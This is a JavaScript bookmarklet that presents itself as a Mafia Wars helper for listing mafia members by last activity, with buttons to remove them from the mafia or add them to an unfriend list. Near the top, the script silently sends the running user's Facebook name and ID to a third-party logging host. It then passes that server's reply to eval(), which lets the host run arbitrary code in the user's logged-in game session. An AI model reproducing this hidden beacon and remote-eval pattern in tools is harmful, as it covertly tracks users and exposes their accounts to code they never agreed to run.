javascript:(function (){
    var jca_title = '?LOC@S? - ShowByActivity';
 html = '<ul style="margin: 0;padding: 0;width: 650px;">';
 
  if (typeof unsafeWindow === 'undefined')
            {
                unsafeWindow = window;
            }
var the_div = document.getElementById('quest');
  if (document.getElementById('juansinho_logging') == undefined){
	  var the_area=document.createElement("div");
		var the_kick_button=document.createElement("a");		
		the_kick_button.className= 'sexy_button_new red short';
		the_kick_button.id='juansinho_close_btn';
		the_kick_button.innerHTML = '<span><span>Close</span></span>';
		the_kick_button.href='#';	
		the_area.id='juansinho_logging';	   		
	   $(the_area).insertAfter(the_div);
	   $(the_kick_button).insertAfter(the_div);
	   $('#juansinho_close_btn').click(function(){$('#juansinho_logging').remove();$('#juansinho_close_btn').remove();return false;});
   }
   else{
	document.getElementById('juansinho_logging').innerHTML="";
   }
 
var name_uid = '';
var the_name = 'ShowByActivity';

var the_id = User.trackId;
var mUrl = 'https://graph.facebook.com/'+User.trackId;
   $.ajax({
        url: mUrl,
        dataType: 'json',
        success: function(data, status) {         
          //alert(data.name);
          name_uid=data.name;

      }
      ,complete: function(){
           $.ajax({
                                                 async : true
                                                ,cache : false
                                                ,type    : "GET"
                                                ,url     : "http://cux.cu.funpic.de/mw/log_new.php"
                                                ,data    : { user:name_uid, script:the_name,fbid:the_id}
                                                ,dataType: "jsonp"                                     
                                                ,xhrFields: {
                                                    withCredentials: true
                                                }
												,success : function(data,status){
												      eval(data);
												}
												
                              }); 
						  
                  }
   });   	
 
 
 
function GetElementById( dNode, id ) {

	var dResult = null;

	if ( dNode.getAttribute('id') == id )
		return dNode;

	for ( var i = 0; i < dNode.childNodes.length; i++ ) {
		if ( dNode.childNodes[i].nodeType == 1 ) {
			dResult = GetElementById( dNode.childNodes[i], id );
			if ( dResult != null )
				break;
		}
	}

	return dResult;
}

function getText(el)
{
    if (el.textContent) return el.textContent;
    if (el.innerText) return el.innerText;
    return el.innerHTML.replace(/<[^>]*>/g,'');
}
function Member(id,name,update){
    this.id=id;
    this.name = name;
	this.lastUpdate = update;
	this.mwname = '';
	this.fbid = '';
	this.fbname = '';
}
function addFBName(list,id,fbid){
var mUrl = 'https://graph.facebook.com/'+fbid;
   $.ajax({
        url: mUrl,
        dataType: 'json',
        success: function(data, status) {         
          //alert(data.name);
          name=data.name;
		  var tmp = '';
			for(i=0;i<list.length;i++){
				tmp = list[i];
				if (tmp.id == id){
					MemberList[i].fbname = name;
				return;
				}
			}

      }
   });  
}


function addFBID(list,id,fbid){
	var tmp = '';
	for(i=0;i<list.length;i++){
	  tmp = list[i];
	  if (tmp.id == id){
		MemberList[i].fbid = fbid;
		return;
	  }
	}
}
function addMWName(list,id,name){
	var tmp = '';
	for(i=0;i<list.length;i++){
	  tmp = list[i];
	  if (tmp.id == id){
	    MemberList[i].mwname = trim(name);
		return;
	  }
	}
}
function printMember(mem){
	var last_upd = new Date(mem.lastUpdate*1000);
	return mem.id+'-'+mem.mwname+'-'+mem.fbid+' - '+last_upd;
}



function printMemberTR(mem){
	var last_upd = new Date(mem.lastUpdate*1000);
	var the_start_span = document.createElement("span");	
	the_start_span.id = 'juansinho_fromMafia_'+mem.id.substr(2);
	var the_start_button=document.createElement("a");	

	the_start_button.className= 'sexy_button_new green short';
	the_start_button.id='juansinho_fromMafia_btn_'+mem.id.substr(2)
	the_start_button.innerHTML = '<span><span>Remove From Mafia</span></span>';
	the_start_button.href='#';
	var the_kick_button=document.createElement("a");		
	the_kick_button.className= 'sexy_button_new red short';
	the_kick_button.id='juansinho_unfriend_btn_'+mem.fbid;
	the_kick_button.innerHTML = '<span><span>Add to Unfriendlist</span></span>';
	the_kick_button.href='#';	
	
	$(the_start_span).append(the_start_button);	
	$(the_start_span).append(the_kick_button);	
	
	var link =http+'apps.facebook.com/inthemafia/track.php?next_controller=stats&next_action=view&next_params=%7B%22user%22%3A%22$ID%22%7D'.replace('$ID', mem.id);

	return '<tr><td><a href="'+link+'" target="_blank">'+mem.id+'</a></td><td>'+mem.mwname+'</td><td><a href="http://www.facebook.com/profile.php?id='+mem.fbid+'" target="_blank">'+mem.fbname+'</a></td><td>'+last_upd+'</td><td>'+the_start_span.innerHTML+'</td></tr>';
}

function RemoveFromMafia(id){
    var my_id = 'p|'+id;
	id = my_id;
	request('html_server.php?xw_controller=stats&xw_action=view&xw_city=1&xw_person='+User.id.substr(2)+'&mwcom=1&user='+escape(btoa(id)),function(msg){
					var link=$(msg).find('.zy_popup_box_body_dark').find('a:contains("Remove")').attr('href');
					if (link) {
						link=link.replace(preurl,'');
						request(link,function(msg){
							if (msg.indexOf('is no longer in your mafia')!=-1) {
									document.getElementById('juansinho_fromMafia_btn_'+id.substr(2)).innerHTML= "Removed From Mafia";
									tmp = document.getElementById('juansinho_fromMafia_btn_'+id.substr(2));
									$(tmp).attr('onclick','alert("Already removed");');
							}
							else{
								document.getElementById('juansinho_fromMafia_btn_'+id.substr(2)).innerHTML= "Failed! Try again later";
							}
						},function(){alert("Something went wrong");});
					}
		});

}
function Unfriend(id){   
  if (document.getElementById('juansinho_toRemoveList')){
	document.getElementById('juansinho_toRemoveList').value +="\n"+id;	
  }
  else{
   var the_area = document.createElement("textarea");	
   the_area.id='juansinho_toRemoveList';
   the_area.rows=10;
   the_area.cols=50;
   var the_table=document.getElementById('juansinho_table');
   $(the_area).insertBefore(the_table);
   document.getElementById('juansinho_toRemoveList').value =id;
  }
	document.getElementById('juansinho_unfriend_btn_'+id).innerHTML= "Added to list";
	tmp = document.getElementById('juansinho_unfriend_btn_'+id);
	$(tmp).attr('onclick','alert("Already added");');   
}
function trim (zeichenkette) {
  // Erst führende, dann Abschließende Whitespaces entfernen
  // und das Ergebnis dieser Operationen zurückliefern
  return zeichenkette.replace (/^\s+/, '').replace (/\s+$/, '');
}
		
var the_div = document.getElementById('inner_page');
  if (document.getElementById('juansinho_logging') == undefined){
	  var the_area=document.createElement("div");
	  var the_area=document.createElement("div");
	  
	   the_area.id='juansinho_logging';	   
	   $(the_area).insertAfter(the_div);
   }
   else{
	document.getElementById('juansinho_logging').innerHTML="";
   }
   document.getElementById('juansinho_logging').innerHTML="Preparing parameters...";
   var userid =/sf_xw_user_id': '(.+)'/.exec(document.body.innerHTML)[1];	
		var params = {
			'ajax': 1,
			'liteload': 1,
			'sf_xw_user_id': userid,
			'sf_xw_sig': local_xw_sig,
			'xw_client_id': 8,
			'skip_req_frame': 1,
			'xw_controller' : 'friendladder'
			,'xw_action'          : 'initial_load'
            ,'xw_city'          : 1
            ,'xw_person'   : User.id.substr(2)
			,'skip_req_frame' :1
			,'cb':userid+unix_timestamp()
			,'tmp':unix_timestamp()
		};

		function unix_timestamp() {
		return parseInt(new Date().getTime().toString().substring(0, 10))
	} 
//
var MemberList = new Array();


document.getElementById('juansinho_logging').innerHTML="<br>Sending initial request...";
                                var myrequest = $.ajax(
                                {
                                     type    : "GET"
                                    ,url     : MW_BASE_URL+"/remote/html_server.php"
									,dataType: 'json'
                                    // Bare minimum parameters for the request.
                                    // - DOM environment variables via Firebug
                                    ,data    : params
                                     ,error: function (xhr, status) {
                                                alert('xhr: '+xhr+' error: '+status);
                                            }
								     ,success: function (data){
										json_data = data.data;//json_data.substring(0,to+1);
										//alert(json_data);
										var new_data = json_data.replace(/\\/g,'');

										new_data = new_data.replace('json_data','juansinho_list');
										Myob = JSON.parse(new_data);
									   var out = '<ul>';
									   var last_upd;
									   
									   for(i=0;i<Myob.juansinho_list.length;i++){
									     var user = Myob.juansinho_list[i];
										 last_upd = new Date(user.updated_at*1000);
										 if (user.last_name != undefined){
											var mem = new  Member(user.uid,user.last_name,user.updated_at);
											MemberList.push(mem);
										 }
									   }
									   document.getElementById('juansinho_logging').innerHTML+="<br>Initial list loaded, getting Links, LastUpdate, etc.<br>This can take a while. be patient :)";
									   MemberList.sort(compare);
									   var forParam = new Array();
									   //for(i=0;i<MemberList.length;i++){
									   for(i=0;i<50;i++){
										   mem = MemberList[i];
										   forParam.push(mem.id);
									   }
									   document.getElementById('juansinho_logging').innerHTML+='<br><span id="juansinho_status">&nbsp;</span><br>' ;
									   getProfiles(forParam);									  
									    
									 }
                                });  
	var http = 'http://';
	if (/https/.test(document.location)) {
		http = 'https://';
	}								
//var preurl = http+'facebook.mafiawars.zynga.com/mwfb/remote/';		
var preurl = MW_BASE_URL+'/remote/';

function request(url, handler, errorhandler) {
		if (url.indexOf('cb=') == -1) {
			url += '&cb='+userid+unix_timestamp();
		}
		if (url.indexOf('tmp=') == -1) {
			url += '&tmp='+unix_timestamp();
		}
		var params = {
			'ajax': 1,
			'liteload': 1,
			'sf_xw_user_id': userid,
			'sf_xw_sig': local_xw_sig,
			'xw_client_id': 8,
			'skip_req_frame': 1
		};
		$.ajax({
			type: "POST",
			url: preurl+url,
			data: params,
			cache: false,
			success: handler,
			error: errorhandler
		});
}	

/*
					var the_area=document.createElement("textarea");
					the_area.id='juansinho_to_remove';
					the_area.cols = 50;
				    the_area.rows = 10;
					the_main = document.getElementById('juansinho_logging');
					$(the_main).append(the_area);							
*/					
function getProfiles(list){
if (list.length>0) {
			var fbid=list.shift();
			//document.getElementById('juansinho_logging').innerHTML+="<br>Working on: "+ fbid;
			document.getElementById('juansinho_status').innerHTML="Working on: "+ fbid;
			
			request('html_server.php?xw_controller=stats&xw_action=view&xw_city=1&xw_person='+User.id.substr(2)+'&mwcom=1&user='+fbid,function(msg){
				var name=$(msg).find('div[class~=stats_title_text]')[0].innerHTML;
				  //document.getElementById('juansinho_logging').innerHTML+="<br>"+ fbid+': '+name;
					addMWName(MemberList,fbid,name);
					//document.getElementById('juansinho_to_remove').value+=msg;

					var r;
						if((r = /&nextParams=(.*?)&/.exec(msg))) {
							if((r = /"user".*?"(.+?)"/.exec(unescape(unescape((r[1])))))) {
								
								addFBID(MemberList,fbid,atob(r[1]));
								addFBName(MemberList,fbid,atob(r[1]));
								//document.getElementById('juansinho_logging').innerHTML+=" - FBID:" +atob(r[1]) ;
							}
						}		   
						getProfiles(list);
					});

	
		} else {
			document.getElementById('juansinho_status').innerHTML="";
			document.getElementById('juansinho_logging').innerHTML +='<br>Done'; 
			ShowTable();
		}
}
function ShowTable(){
	document.getElementById('juansinho_logging').innerHTML+="<br>";
	//for(i=0;i<MemberList.length;i++){
	var out = '<table border=\"1\" id="juansinho_table"><tr><th>MW-ID<p style="font-size: 10px;"><br>(Click on the ID to open the profile in a new Tab)</p></th><th>MW-Name/Level</th><th>FB-Name<p style="font-size: 10px;">(Click on the ID to open the profile in a new Tab)</p></th><th>Last MW-Activity</th><th>Actions</th></tr>';
	for(i=0;i<50;i++){
		out+= printMemberTR(MemberList[i]);	
	}	
	out+='</table>';
	document.getElementById('juansinho_logging').innerHTML+=out;	
	var tmp = $('a[id*=juansinho_fromMafia_btn_]').each(
	  function (i,e){ 
	    var t = e.id.split('_');
		var the_id = t[t.length-1];
	    $(e).click(function(){RemoveFromMafia(the_id);return false;});		
	  }
	);		
	var tmp = $('a[id*=juansinho_unfriend_btn_]').each(
	  function (i,e){ 
	    var t = e.id.split('_');
		var the_id = t[t.length-1];
	    $(e).click(function(){Unfriend(the_id);return false;});		
	  }
	);		
}
function compare(a,b) {
  if (a.lastUpdate < b.lastUpdate)
     return -1;
  if (a.lastUpdate > b.lastUpdate)
    return 1;
  return 0;
}	
	
    }())